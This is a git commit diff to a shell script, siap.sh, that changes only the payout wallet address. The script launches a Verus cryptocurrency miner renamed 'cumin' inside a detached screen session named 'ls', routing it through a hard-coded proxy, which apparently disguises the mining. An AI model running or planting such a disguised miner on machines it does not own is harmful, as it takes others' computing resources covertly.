6aef87efab960d4a764982817526c944c4506182
githaeka <92292441+githaeka@users.noreply.github.com>
2021-10-11 15:53:10 +0000

    Update siap.sh

--- siap.sh
+++ siap.sh
@@ -4,7 +4,7 @@ sudo apt install screen libjansson4 -y
 chmod +x cumin
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RXM8Btq8mJuPPk19t7B6hgZsty7p14cbpG
+WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
 WORKER=$(echo $(shuf -i 1-1 -n 1)-YX)
 PROXY=http://193.41.88.58:53281
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
